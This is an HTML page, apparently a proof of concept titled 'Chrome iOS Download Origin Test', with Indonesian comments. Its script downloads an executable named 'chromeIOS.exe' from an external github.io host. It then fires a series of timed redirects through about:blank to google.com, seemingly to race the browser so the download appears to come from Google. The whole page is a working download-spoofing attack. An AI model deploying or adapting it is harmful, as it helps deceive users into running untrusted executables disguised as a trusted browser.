<!doctype html>
<html>
<head>
<meta charset="utf-8">

<style>
body{
  font-family:Arial;
  text-align:center;
  margin-top:120px;
}

.button{
  background:#4CAF50;
  border:none;
  color:white;
  padding:16px 36px;
  font-size:18px;
  cursor:pointer;
}
</style>

<script>

const FILE="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";

function runTest(){

  console.log("Triggering download");

  startDownload();

  // beberapa timing race window
  const timings=[150,200,240,280,320,360];

  timings.forEach((t)=>{
    setTimeout(()=>{
      redirectStep();
    },t);
  });

}

function startDownload(){

  let a=document.createElement("a");
  a.href=FILE;
  a.download="chromeIOS.exe";

  document.body.appendChild(a);

  // trigger click setelah frame berikutnya
  requestAnimationFrame(()=>{
    a.click();
    a.remove();
  });

}

function redirectStep(){

  console.log("Redirect sequence");

  // tahap pertama
  location.href="about:blank";

  // tahap kedua
  setTimeout(()=>{
    location.replace("https://google.com");
  },50);

}

</script>

</head>

<body>

<h2>Chrome iOS Download Origin Test</h2>

<br>

<button class="button" onclick="runTest()">
Start Download Test
</button>

</body>
</html>
